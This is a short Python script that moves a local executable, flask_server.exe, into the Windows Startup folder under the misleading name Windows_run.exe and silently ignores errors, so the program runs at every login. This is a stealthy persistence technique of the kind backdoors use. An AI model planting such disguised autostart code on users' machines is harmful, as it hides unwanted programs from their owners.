import os

def auto_run():
    script_path = "C:\\Back\\flask_server.exe"
    startup_dir = os.getenv('APPDATA')  + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows_run.exe" #C:\Users\Ilay\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    try:
        os.rename(script_path, startup_dir)
    except:
        pass

auto_run()